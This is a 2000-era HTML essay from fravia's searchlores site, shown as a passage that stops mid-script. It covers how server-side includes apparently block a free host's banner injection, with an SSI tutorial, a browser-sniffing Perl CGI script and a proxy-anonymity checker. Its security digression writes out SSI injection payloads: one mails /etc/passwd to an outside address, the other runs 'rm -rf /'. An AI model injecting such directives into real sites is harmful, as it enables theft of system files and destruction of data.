@@ -1,0 +1,1019 @@
+<HTML>
+<HEAD>
+<TITLE>phostban.htm: free.prohosting.com, banners, & server-side includes</TITLE>
+</HEAD>
+<BODY BGCOLOR=#C0C0C0 TEXT=#001010 VLINK=#405040>
+
+<P><A NAME="anchortop"></A></P>
+<center>
+<a href="remobann.htm"><IMG SRC="images/bilivasi.jpg" alt="remobann.gif" 
+ALIGN=BOTTOM WIDTH=353 HEIGHT=124 BORDER=0 VSPACE=0 HSPACE=0></a><br><br>Courtesy of 
+fravia's <a href="http://www.searchlores.org">searchlores</a><br>
+<hr>
+<font size=+4><i>free.prohosting.com, banners, & server-side includes</i>
+<br>by Alex<br>June 2000 </fonT>
+<bR><hr width=44%>
+<i>Fundamental anti-advertisement essay. You need to read this if you are serious about 
+nuking advertisement. A wealth of hints. Some of the code snippet that Alex includes can be easily developed 
+into adhoc anti-advertisement (or else&nbsp;:-) tools...</i>
+</center>
+
+
+
+<hr>
+<center><h2>free.prohosting.com, banners, & server-side includes</h2><hr width=50%></center>
+
+<p><h4>Introduction</h4>
+<p align=justify>
+This brief text describes the quite accidental elimination of vile banners on a free webspace
+provider. The digression on Server-Side Includes is
+necessarily brief and superficial - those interested can easily find O'Reilly and other books in 
+html on this and other subjects all over the web - the <a href='http://books.kiss.uni-lj.si'>Slovenian 
+Mirror</a> has several, for example.
+
+<p><h4>Prohosting & its banners</h4>
+
+<p align=justify>
+<a href=http://free.prohosting.com'>Prohosting</a> is a free webspace provider offering 30Mb (or it did
+when I created my site).
+Prohosting's main attractions, apart from a reasonable amount of space, were 
+the use of server-side includes, user cgi scripts, and no obligatory banners - as far as I know, SSI 
+and user CGI scripts are not often available on free hosts. Sad to relate, the 
+last condition has been changed, and Prohosting's new policy is to insert a hideous banner on <i>every</i> page.
+<p align=justify>
+I was surprised to learn of this change of policy (long after it had been implemented), as I had seen 
+no banners on any of my pages. All my pages are shtml (see <a href='phostban.htm#SSI'>SSI digression</a> below) 
+- some execute CGI scripts (see <a href='phostban.htm#M$IE'>Anti-M$IE SSI & CGI example</a> 
+below), and almost all include 'boilerplate' code (header and footer html files, for example).
+
+<p align=justify>
+Brief investigation shewed that any cgi script or normal html page accessed directly had the banner code inserted, 
+although the files have not been modified on disk. The inserted banner code is as follows:
+
+<pre>
+&lt;//--&gt;&lt;//"--&gt;&lt;center&gt;
+&lt;a href=http://www.prohosting.com&gt;&lt;img src="/banner3.gif" alt=ProHosting.com border=0&gt;&lt;/a&gt;
+&lt;/center&gt;
+</pre>
+This code appears on a single line immediately after the <i>&lt;body&gt;</i> tag - ie. at the <i>top</i> of 
+<i>every</i> page, where it 
+does maximum damage to the design of your page (it goes without saying that <i>banner3.gif</i> is
+by no means a thing of beauty). The purpose of the code <i>&lt;//--&gt;&lt;//"--&gt;</i> is  obscure 
+to me - it may just be a marker.
+<p align=justify>
+The server appears to be 'injecting' the banner html 
+into the byte stream 'on the fly' as it responds to the browser's GET request. So how have my pages, 
+accessed the normal way, remained banner-free? It seems that in some way the server-side includes fsck 
+up the banner-insertion mechanism - the first line in each file is some SSI directive; even my <i>index.shtml</i>, 
+which only <i>#exec</i>'s a cgi script that in turn inserts a plain html file (which file is M$IE-dependent)
+into the output stream, is not affected. Some files contain no html at all: this, for example, which just displays
+an image on a standard page:
+<pre>
+&lt;!--#set var="title" value="Image"--&gt;
+&lt;!--#include file="head.shtml"--&gt;
+&lt;!--#exec cgi="../cgi-bin/disp_img.cgi"--&gt; 
+&lt;!--#include file="foot.shtml"--&gt;
+</pre>
+<p align=justify>
+Perhaps the banner-injector only scans the <i>requested</i> 
+file, and finding no <i>&lt;body&gt;</i> tag, gives up the unequal struggle - this is mere speculation, 
+but is lent a little force by the fact that the <i>&lt;body&gt;</i> tag appears in no file that is requested in 
+the normal way (<i>index.shtml</i> and the files linked to it), whereas it does, of course, in normal html files 
+and the output of cgi scripts that output complete web pages.
+<p align=justify>
+If you want to observe this effect without making your own site on Prohosting, you can look at 
+<a href='http://lightning.prohosting.com/~amphi/'>mine</a> to see bannerless pages, and then access this 
+<a href='http://lightning.prohosting.com/~amphi/cgi-bin/env-chk.cgi'>cgi script</a> directly to see the dread 
+banner.
+<p align=justify>
+I imagine Prohosting are doing this 'live' banner injection to avoid the elimination of
+their ads by the various well known tricks employed on hosts that use bots to edit other people's html.
+And perhaps, even the bots might be defeated by a wrapper <i>index.shtml</i> that had only one line, thus:
+<pre>&lt;--#include file='doc/real_index.html'--&gt;</pre>
+<p align=justify>
+Of course, your host would have to have SSI enabled - if it doesn't, you could always ask the admins 
+to turn it on for you - you never know, they might.
+<p align=justify>
+I have no idea why SSI seems to kill Prohosting's banners, but perhaps this will work on other hosts 
+that allow SSI and use a similar method for inserting their ghastly advertisements. The nice thing 
+about this is that the admins have no excuse to punish you, and your pages remain untarnished. Long may it it last.
+<p align>
+Since this is all rather thin and inconclusive, I have written a short and incoherent 'digression' on 
+SSI for those that wot not of it, and included an <a href='phostban.htm#M$IE'>SSI/CGI M$IE sentry</a>, and an 
+anonymous proxy-checking perl cgi <a href='phostban.htm#proxyjudge'>script</a>.
+<p><center><hr width=50%></center>
+<h4><a name='SSI'>SSI digression</h4>
+
+<p align=justify>
+<i>Server-Side Includes</i> or <i>Server-Parsed HTML</i> is a method of inserting directives into an 
+HTML document that are evaluated by the server when the page is accessed. Documents containing 
+such directives have an extension of <i>.shtml</i> - it is this extension that lets the server know that 
+it should 'parse' the file, ie. check it for directives, execute them, and then pass the resulting 
+html to the requesting browser, rather than just feed the html directly to the browser, as is 
+normally the case. There are two caveats regarding SSI - it can be a security hazard, and the parsing 
+can put a considerable load on the server.
+
+<p align=justify>
+On the other hand, SSI can be very useful - it is also extremely simple, and can be learnt in 
+perhaps half an hour, although to understand how to use it effectively will probably require some  
+experimentation. All the directives are listed in the nice O'Reilly table below:
+
+<P> <!-- table courtesy of O'Reilly -->
+<DIV CLASS="table">
+<TABLE BORDER=2 align=center>
+<CAPTION><A NAME="CGI-CHP-5-TBL-1" CLASS="TITLE">SSI Directives</A></CAPTION>
+<TR CLASS="row">
+<TH ALIGN="left">
+
+<P CLASS="para">
+Command</TH>
+<TH ALIGN="left">
+
+<P CLASS="para">
+Parameter</TH>
+<TH ALIGN="left">
+
+<P CLASS="para">
+Description</TH>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">echo</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">var</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Inserts value of special SSI variables
+as well as other environment variables</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">include</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Inserts text of document into current
+file</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">file</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Pathname relative to current directory</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">virtual</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Virtual path to a document on the server</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">fsize</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">file</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Inserts the size of a specified file</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">flastmod</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">file</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Inserts the last modification date and
+time for a specified file</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">exec</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Executes external programs and inserts
+output in current document</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">cmd</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Any application on the host</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">cgi</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+CGI program</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">config</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Modifies various aspects of SSI</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">errmsg</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Default error message</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">sizefmt</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Format for size of the file</TD>
+</TR>
+<TR CLASS="row">
+<TD ALIGN="left">
+
+<P CLASS="para">
+</TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+<I CLASS="emphasis">timefmt</I></TD>
+<TD ALIGN="left">
+
+<P CLASS="para">
+Format for dates</TD>
+</TR>
+</TABLE>
+<p align=center><font size=-1> (Nice table from <i>CGI Programming on the World Wide Web)</i></font>
+<p align=justify>
+The most commonly used directive is <i>#include</i>, which tells the server to insert the contents of
+another file at the point where the directive appears. An obvious example is a standard header and footer 
+that appears on every page. Such an shtml file might look as follows:<p>
+<pre>&lt;!--#include file="head.html"--&gt;</pre>
+<blockquote><i>[the body of the page here]</i></blockquote>
+<pre>&lt;!--#include file="foot.html"--&gt;</pre>
+<p align=justify>
+Note that the included files need not have an <i>.shtml</i> extension, but the file in which the 
+directives appear must. All directives start with <blockquote><pre>&lt;!--#</pre></blockquote> and 
+end with <blockquote><pre>--&gt;</pre></blockquote> 
+ie. they are embedded in comments.
+
+<p align=justify>
+Viewing the source in the browser will give no sign of this chicanery - the code will seem to be that 
+of a normal html page.
+<p align=justify>
+I use an included <i>head.html</i> to set the background, text, link, & vlink colours for all my pages 
+- if I ever want to change them, it's very easy - it's all in one place. Of course, you can do 
+more elaborate things, such as having a strip of navigation buttons in a 'header' file, or whatever.
+<p align=justify>
+SSI has access to environment variables, as well as special SSI ones. Some environment variables are:
+<blockquote><pre>
+HTTP_USER_AGENT		browser name string
+HTTP_REFERRER		url of previous document
+REMOTE_HOST		remote hostname of user making request
+REMOTE_ADDRESS		remote ip address of user making request
+SERVER_SOFTWARE		name and version of software handling request
+SERVER_PORT		port no. of host on which server is running
+</pre></blockquote>
+<p align=justify>
+The value of any of these (and other) environment variables can be displayed on a web page with the 
+directive:
+<blockquote><pre>
+&lt;!--#echo var='ENV_VAR'--&gt;
+</pre></blockquote>
+<p align=justify>
+where <i>ENV_VAR</i> is one of the environment variables, eg:
+<blockquote><pre>
+Welcome, my dear visitor from &lt;!--#echo var='REMOTE_ADDR'--&gt;
+</pre></blockquote>
+would produce something like
+<blockquote>
+Welcome, my dear vistor from 218.56.134.78
+</blockquote>
+An example of an SSI variable is LAST_MODIFIED - the code
+<pre>
+Document last modified on &lt;--!#echo var="LAST_MODIFIED"--&gt;
+</pre>
+<p align=justify>will produce
+<blockquote>Document last modified on Monday, 22-May-2000 14:01:13 NPT</blockquote>
+or whatever the modification date is.
+<p align=justify>
+The <i>#flastmod</i> directive is more flexible - it can display the modification date of any file, 
+rather than just that of the current file, thus:
+<blockquote><pre>
+&lt;!--#flastmod file="tgz/perlprog.tar.gz"--&gt;
+</pre></blockquote>
+<p align=justify>
+The <i>#fsize</i> directive displays the size of a file in a similar way.
+<p align=justify>
+You can also assign values to your own variables, thus:
+<blockquote><pre>
+&lt;!--#set var="button_name" value="home"--&gt;
+</pre></blockquote>
+and then use them, thus:
+<blockquote><pre>
+&lt;img src="img/&lt;!--#echo var='button_name'--&gt;.png"&gt;
+</pre></blockquote>
+<p align=justify>
+which would produce the following html after evaluation:
+<blockquote><pre>
+&lt;img src="img/home.png"&gt;
+</pre></blockquote>
+<p align=justify>
+Conditional constructs are also possible (although they seem to have been omitted from O'Reilly's nice table 
+above) -  a trivial example:<p>
+<blockquote><pre>
+&lt;!--#set var="location" value="home"
+--&gt;&lt;!--#if expr="\"$location\" = \"home\""
+--&gt;&lt;!--#set var="home_button" value="home_lit"
+--&gt;&lt;!--#else
+--&gt;&lt;!--#set var="home_button" value="home"
+--&gt;&lt;!--#endif--&gt;
+&lt;img src='img/&lt;!--#echo var="home_button"--&gt;.png'&gt;
+</pre></blockquote>
+<p align=justify>
+Here a value is assigned to the variable <i>location</i>, and depending on its value, text is inserted into the name 
+of the image to be displayed. Obviously, in a real-world example, the variable would be set in one file, and the 
+substitution made in another <i>#include</i>'d file. An example would be a page that set the location variable so that 
+the appropriate button could be lit in a navigation bar whose code is <i>#include</i>'d from another file.
+<p align=justify>
+Note that the backslashes are necessary to 'escape' the inner quotes, & the $-sign in $location 
+signifies that it is a variable rather than a literal.
+<p align=justify>
+The most powerful (and most dangerous from a security point of view) is the <i>#exec</i> directive. It 
+comes in two flavours, <i>cmd</i> and <i>cgi</i>. The first can execute any program on the host (that 
+httpd (the web server daemon) has permission to execute, I imagine, but I'm not certain), eg:<p>
+<blockquote><pre>
+&lt;!--#exec cmd="uptime"--&gt;
+</pre></blockquote>
+would produce something like
+<blockquote>03:19  up 19 days, 7 hours,  4 users, load average 0.02, 0.48, 0.78</blockquote>
+<p align=justify>
+having executed the unix <i>uptime</i> command and captured its output.
+<p align=justify>
+An example of the syntax for executing a cgi script can be found below, in the <a href='phostban.htm#M$IE'>
+M$IE sentry section</a>.
+<p align=justify>
+An example of an SSI security hazard is the famous 'guestbook exploit' - many guestbooks allow 
+posters to include html tags to tart up their messages. If SSI is enabled and the guestbook cgi script 
+does not filter SSI directives, it is possible to enter something like:
+<blockquote><pre>
+&lt;!--#exec cmd="mail cracker@hotmail.com < /etc/passwd"--&gt;
+</pre></blockquote>
+<p align=justify>
+which will attempt to email the server's password file to the selected address, not that the passwd 
+file is much use in these days of shadowed passwords; or, more destructively:
+<blockquote><pre>
+&lt;!--#exec cmd="rm -rf /"--&gt;
+</pre></blockquote>
+<p align=justify> This exploit is so well known that it is unlikely to work any more, but you never know. Also, the 
+second example (which attempts to delete recursively all the files on the server) is unlikely to to do much, 
+unless httpd is running as root (something so stupid that it is very unlikely 
+to be encountered - or perhaps not), and, in my opinion, mindlessly destructive and indicative of terminal cretinism 
+in the perpetrator (unless, of course, the site constitutes a 'crime against Humanity', and we are nothing if not 
+'humanitarian' nowadays, as the ruins of Yugoslavia and Iraq, amongst others, so eloquently attest).
+<p align=justify>NB. To test SSI, the page must be accessed via a server - File->Open will not work. I know 
+of no WYSIWYG web page editor that can emulate SSI, although it would be  a very useful feature, and not, I imagine,
+very difficult to implement. If you 
+use Linux (or any of the other *nices), it is not difficult to get Apache up and running in order to experiment with SSI (remember 
+to add <i>Includes</i> to the appropriate <i>Options</i> line in <i>/etc/httpd/conf/access.conf</i>, or wherever your 
+<i>access.conf</i> is located). The luckless users of 
+a notorious 24-bit OS will have more difficulty getting a web server going on their boxes, I imagine - yet 
+another reason to abandon that sinking ship, as if any more were needed. If
+you have no local web server, you have no recourse but to upload your files, try them out, admire the 
+'there was an error processing this directive' message, return to your text editor, and begin the 
+cycle again.
+<p><center><hr width=50%></center>
+<h4><a name='M$IE'>Anti-M$IE SSI & CGI example</h4>
+<i>index.shtml</i>
+<blockquote><pre>&lt;!--#exec cgi="cgi-bin/browser.cgi"--&gt;</pre></blockquote>
+
+<p align=justify>
+This is my M$IE sentry - an shtml file with only one line in it, a directive to execute a cgi script 
+(cgi-bin/browser.cgi). The cgi script outputs an html file, differing depending on the browser accessing the page, and 
+the server inserts it into <i>index.shtml</i>. In fact, you could have <i>
+browser.cgi</i> in your root directory, called <i>index.cgi</i>, but often only the cgi-bin 
+directory has the requisite permissions for executing cgi scripts - and (at least on Prohosting), a 
+banner will be inserted if the cgi is accessed directly.
+<p align=justify>
+<i>browser.cgi</i> (a perl script) is what does the job - it checks the environment variable HTTP_USER_AGENT 
+to see whether the dread letters MSIE are to be found in the name of the user agent (browser accessing the page
+ - the HTTP_USER_AGENT variable is a field in the GET request header sent by the browser to the server; filtering 
+ proxies like JunkBuster can be instructed to modify this variable, a very useful feature); 
+if they are found, it 'prints' an html file with various diappointing messages, otherwise it prints 
+the 'normal' <i>index.html</i>. The two files <i>index.html</i> and <i>msie-index.html</i> are 
+ordinary html files. The Perl <i>print</i> command just prints to STDOUT (standard output, normally the 
+console, or screen), but cgi scripts' output is redirected to the server's outgoing byte stream. <p>
+The code is as follows:
+<p>
+
+<i>browser.cgi</i>
+
+<pre>
+#!/usr/bin/perl
+
+print "Content-type:text/html", "\n\n";			# this is for the header - it needs 2 newlines
+
+if ($ENV{'HTTP_USER_AGENT'} =~ /MSIE/) {		# browser name string
+	$html_document = "../shtml/msie-index.html";	# fsck off page
+} else {
+	$html_document = "../shtml/index.html";		# good guy page
+}
+
+if (open(HTML, "&lt;".$html_document)) {		# open the file $html_document
+	while (&lt;HTML&gt;) {				# while not EOF
+		print;					# output the current line
+	}
+	close (HTML);
+}
+exit (0);						# exit with 'ok' code
+</pre>
+
+<p align=justify>
+That's it - the M$IE user (or 'victim') gets one page, and users of less repulsive browsers another; 
+and neither sees that there is any other page. This is a trivial example, but it demonstrates the 
+execution of a cgi script from an shtml document, and the script is, perhaps, a little more amusing than 
+the customary 'Hello, World'; the ease with which it does its grim work should serve as an 
+encouragement to any who feel daunted by the prospect of learning Perl. 
+<p><center><hr width=50%></center>
+<a name='proxyjudge'><h4>Proxy Judge</h4>
+<p align=justify>
+This is a handy cgi perl script included for good measure - it tests the anonymity of your proxy 
+server, displaying relevant environment variables, and rating your anonymity from 1 to 5 (1 being 
+the best, and 5 the worst). I didn't write it, I just found it somewhere. Quite a lot can be learnt 
+from studying the code, I think.
+<p>
+<pre>
+#!/usr/bin/perl
+
+# ProxyJudge V2.27
+#
+# ANONYMIZER dimdim
+# cry@cker.104.net
+# http://anonymizer.site.ne.jp/
+
+#-----// title tag //-----#
+$title   = 'ProxyJudge V2.27';
+
+#-----// BODY tag //-----#
+$body    = 'bgcolor="#000000" text="#ffffff" link="#00ddff" vlink="#ddddff" alink="#0000ff"';
+
+#-----// Warning tag color //----#
+$warn    = '#ff0000';
+
+#-----// Suspect tag color //----#
+$suspect = 'orange';
+
+#-----// Anony Level color //----#
+$levelcolor = 'yellow';
+
+# # # # # # # # # #
+
+$remote_host = $ENV{'REMOTE_HOST'};
+$remote_addr = $ENV{'REMOTE_ADDR'};
+if ( ($remote_host eq $remote_addr) || ($remote_host eq '') ) {
+  $remote_host        = gethostbyaddr(pack('C4', split(/\./, $remote_addr)), 2) || $remote_addr;
+  $ENV{'REMOTE_HOST'} = $remote_host;
+}
+
+while (($a, $b) = each %ENV) {
+  next if ($a !~ /^HTTP_/);
+  $b =~ s/\t/ /g;
+  push(@dat, "$a=\t$b \t$a=\t$b");
+}
+@envdat = sort(@dat);
+
+&remotehost_check();
+&proxyenv_check();
+&spillenv_check();
+
+&judgement();
+
+&html;
+
+exit;
+
+# # # # # # # # # #
+
+#-----// REMOTE_HOST check //----#
+sub remotehost_check {
+  local(@hostz);
+
+  if ($remote_host eq $remote_addr) {
+    $rh_result  = 'IP Addr.';
+    $rh_comment = 'I have no idea.';
+    return;
+
+  } else {
+    $chk_rh = $remote_host;
+    if ($chk_rh =~ /www.*cache|www.*proxy|webcache|delegate|gatekeeper|firewall|proxy|cache|squid|^bbs|^http|^www|^web|^dns|^ftp|^mail|^news|^cgi|^gate|^server|^pop|^smtp|^w3\.|^ns\d{0,2}\.|^fw\d{0,2}\./i) {
+      $chk_rh     =~ s#$&#&lt;FONT color="$warn"&gt;$&&lt;/FONT&gt;#;
+      $rh_result  = 'Via a Proxy';
+      $rh_comment = ' REMOTE_HOST includes proxy server word.';
+
+    } elsif ($chk_rh =~ /server|gate|www|web|dns|ftp|mail|news|cgi|pop|smtp/i) {
+      $chk_rh     =~ s#$&#&lt;FONT color="$suspect"&gt;$&&lt;/FONT&gt;#;
+      $rh_result  = '?';
+      $rh_comment = ' REMOTE_HOST includes proxy server-like word.';
+    }
+
+    @hostz = split(/\./, $chk_rh);
+    if ($#hostz == 1) {
+      $chk_rh     = "&lt;FONT color=\"$suspect\"&gt;$chk_rh&lt;/FONT&gt;";
+      $rh_result  = '?';
+      $rh_comment = " REMOTE_HOST includes only one period, it's dubious.";
+      return;
+
+    } elsif ($rh_result ne 'Via a Proxy') {
+      if ($hostz[0] !~ /\d/) {
+        $hostz[0]    = "&lt;FONT color=\"$suspect\"&gt;$hostz[0]&lt;/FONT&gt;";
+        $rh_result   = '?';
+        $rh_comment .= " REMOTE_HOST includes no numbers, it's dubious.";
+      } elsif ($hostz[0] =~ /\D\d$/) {
+        $hostz[0]    = "&lt;FONT color=\"$suspect\"&gt;$hostz[0]&lt;/FONT&gt;";
+        $rh_result   = '?';
+        $rh_comment .= " REMOTE_HOST includes only one number, it's dubious.";
+      }
+      $chk_rh = join('.', @hostz);
+    }
+  }
+}
+
+# # # # #
+
+#-----// Proxy env. value,User-Agent, Keep-Alive check //----#
+sub proxyenv_check {
+  local($envdat, $name, $val, $namestat, $valstat);
+
+  foreach $envdat (@envdat) {
+    chop($envdat) if ($envdat =~ /\n$/);
+    ($name, $val, $namestat, $valstat) = split(/\t/, $envdat);
+
+    if ( ($name eq 'HTTP_USER_AGENT=') && ($val =~ /via/i) ) {
+      $valstat  =~ s/via/&lt;FONT color="$warn"&gt;via&lt;\/FONT&gt;/i;
+      $result   = 'Via a Proxy';
+      $comment .= ' USER_AGENT includes "via".';
+
+    } elsif ($name eq 'HTTP_CONNECTION=') {
+      if ($val !~ /Keep-Alive/i) {
+        $valstat  = "&lt;FONT color=\"$warn\"&gt;$valstat&lt;/FONT&gt;";
+        $result   = 'Anonymized' if ($result ne 'Via a Proxy');
+        $comment .= " CONNECTION doesn't have \"Keep-Alive\".";
+      } else {
+        $noproxy++;
+        $keepalive = 'existed';
+      }
+
+    } elsif ($name !~ /HTTP_(CONNECTION=|USER_AGENT=|HOST=|PRAGMA=|UA_|ACCEPT|REFERER=|MIME=|EXTENSION=|IF_MODIFIED_SINCE=)/) {
+
+      if ($name !~ /HTTP_(VIA=|.ROXY_.ONNECTION=|X_FORWARDED_FOR=|FORWARDED=|CACHE_CONTROL=|CACHE_INFO=|FROM=|CLIENT_IP=|TE=|SP_HOST=|XONNECTION=)/) {
+        $namestat =~ s/$name/&lt;FONT color="$suspect"&gt;$name&lt;\/FONT&gt;/i;
+        $result   = 'Via a Proxy';
+        $comment .= ' Dubious variable is detected.' if ($comment !~ /Dubious/i);
+      } else {
+        $namestat =~ s/$&/&lt;FONT color="$warn"&gt;$&&lt;\/FONT&gt;/i;
+        $result   = 'Via a Proxy';
+        $comment .= ' Proxy server variable is detected.' if ($comment !~ /Proxy/i);
+      }
+    } else {
+      $noproxy++ if ($name !~ /HTTP_(CONNECTION=|HOST=|PRAGMA=|UA_|ACCEPT|REFERER=|MIME=|EXTENSION=|IF_MODIFIED_SINCE=)/);
+    }
+    $envdat = "$name\t$val\t$namestat\t$valstat\n";
+  }
+  return;
+}
+
+# # # # #
+
+#-----// Spill IP addr. check //----#
+sub spillenv_check {
+  local($envdat, $name, $val, $namestat, $valstat);
+  local($spill);
+  local($hex, $hex_addr);
+  local($itself_host, $spill_host);
+  local($to_host, $ip_tmp, $to_ip);
+  local(%seen, $spill_num);
+  local(@temp);
+
+  foreach $envdat (@envdat) {
+    chop($envdat) if ($envdat =~ /\n$/);
+    ($name, $val, $namestat, $valstat) = split(/\t/, $envdat);
+
+    if ($name !~ /HTTP_(.ONNECTION=|USER_AGENT=|HOST=|PRAGMA=|UA_|ACCEPT|REFERER=|MIME=|EXTENSION=|.ROXY_.ONNECTION=|IF_MODIFIED_SINCE=|CACHE_CONTROL=|CACHE_INFO=)/) {
+      $spill = $val;
+
+      $spill =~ s/$remote_host//g;
+      $spill =~ s/$remote_addr//g;
+
+      $spill =~ s/\([^\(\)]+\)//g;
+      $spill =~ s/ for / /ig;
+      $spill =~ s/ by / /ig;
+      $spill =~ s/ - / /g;
+      $spill =~ s/-\@//g;
+
+      #-----// HTTP_FORWARDED //----#
+      if ($spill =~ m#http://#) {
+        while ($spill =~ s#http://([^:]+):##i) {
+          push(@itself_host, "$1");
+        }
+      }
+
+      #-----// HTTP_VIA //----#
+      if ($name eq 'HTTP_VIA=') {
+        while ($spill =~ s# ([^ :]+):# :#i) {
+          push(@itself_host, "$1");
+        }
+      }
+
+      #-----// HTTP_X_FORWARDED_FOR //----#
+      if ($name eq 'HTTP_X_FORWARDED_FOR=') {
+        while ($spill =~ s#(\d+\.\d+\.\d+\.\d+)\,*# #i) {
+          push(@spill_addr, "$1");
+        }
+      }
+
+      #-----// HTTP_CLIENT_IP //----#
+      if ($name eq 'HTTP_CLIENT_IP=') {
+        $hex = $spill;
+        if ( ($hex !~ /\./) && ($hex =~ s/^([\dA-F]{2})([\dA-F]{2})([\dA-F]{2})([\dA-F]{2})$/$1$2$3$4/i) ) {;
+          if (length($hex) == 8) {
+            $hex_addr = join('.', hex($1), hex($2), hex($3), hex($4));
+            push(@spill_addr, "$hex_addr");
+            $valstat .= " -&gt; $hex_addr";
+          }
+        }
+      }
+      $spill =~ s/:|\,|;|//g;
+
+      #-----// IP addr. //----#
+      if ($spill =~ s/[^a-zA-Z0-9_\-\.]*(\d+)\.(\d+)\.(\d+)\.(\d+)[^a-zA-Z0-9_\-\.]+/$1.$2.$3.$4/i) {
+        $spill_addr = "$1.$2.$3.$4";
+        push(@spill_addr, "$spill_addr");
+      }
+
+      #-----// .***.*** //----#
+      if ($spill =~ /\.[^\.]{2,3}\.[a-zA-Z]{2,3}[^a-zA-Z0-9_\-\.]+/) {
+        $spill =~ s#([a-zA-Z0-9_\-\.]+)\.([^\.]{2,3})\.([a-zA-Z]{2,3})[^a-zA-Z0-9_\-\.]+#$1.$2.$3#i;
+        $spill_addr = "$1.$2.$3";
+        push(@spill_addr, "$spill_addr");
+
+      #-----// .*** //----#
+      } elsif ($spill =~ /\.[a-zA-Z]{2,3}[^a-zA-Z0-9_\-\.]+/) {
+        $spill =~ s#([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,3})[^a-zA-Z0-9_\-\.]+#$1.$2#i;
+        $spill_addr = "$1.$2";
+        push(@spill_addr, "$spill_addr");
+      }
+    }
+    $envdat = "$name\t$val\t$namestat\t$valstat";
+  }
+  foreach $spill_addr (@spill_addr) {
+    if ($spill_addr !~ /www.*cache|www.*proxy|webcache|delegate|gatekeeper|firewall|proxy|cache|squid|^bbs|^http|^www|^web|^dns|^ftp|^mail|^news|^cgi|^gate|^server|^pop|^smtp|^w3\.|^ns\d{0,2}\.|^fw\d{0,2}\./i) {
+      push(@temp, $spill_addr);
+    }
+  }
+  @spill_addr = @temp;
+  #-----// Remove Proxy's IP addr. //----#
+  foreach $itself_host (@itself_host) {
+    next if ($itself_host !~ /\./);
+    $itself_host =~ tr/A-Z/a-z/;
+    chop($itself_host) if ($itself_host =~ /\n$/);
+    foreach $spill_addr (@spill_addr) {
+      $spill_addr =~ tr/A-Z/a-z/;
+      chop($spill_addr) if ($spill_addr =~ /\n$/);
+      if ($itself_host !~ /[a-z]/) {
+        $to_host = gethostbyaddr(pack('C4', split(/\./, $itself_host)), 2);
+      } else {
+        $ip_tmp = (gethostbyname($itself_host))[4];
+        $to_ip  = join(".", unpack('C4', $ip_tmp));
+      }
+      if ( ($itself_host eq $spill_addr) || ($to_host eq $spill_addr) || ($to_ip eq $spill_addr) ) {
+        $spill_addr .= ":x";
+        next;
+      }
+    }
+    $spill_addr .= "\n";
+  }
+  foreach $spill_addr (@spill_addr) {
+    chop($spill_addr) if ($spill_addr =~ /\n$/);
+    if ( ($spill_addr =~ /^127\./) ||
+       ($spill_addr =~ /^172\.1[6-9]\./) ||
+       ($spill_addr =~ /^172\.2\d\./) ||
+       ($spill_addr =~ /^172\.3[0-2]\./) ||
+       ($spill_addr =~ /^10\./) ||
+       ($spill_addr =~ /^192\.168\./) ||
+       ($spill_addr =~ /\.0$/) ||
+       ($spill_addr =~ /^0\./) ||
+       ($spill_addr =~ /\.255$/) ||
+       ($spill_addr =~ /^\d{1,3}\.\d{1,3}\.255\./) ||
+       ($spill_addr =~ /^\d{1,3}\.255\./) ||
+       ($spill_addr =~ /^255\./) ) {
+      $spill_addr .= ':x';
+    }
+    undef($to_host);
+F    undef($to_ip);
+    undef($ip_tmp);
+    if ($spill_addr !~ /[a-z]/) {
+      $to_host = gethostbyaddr(pack('C4', split(/\./, $spill_addr)), 2);
+    } else {
+      $ip_tmp = (gethostbyname($spill_addr))[4];
+      $to_ip  = join(".", unpack('C4', $ip_tmp));
+    }
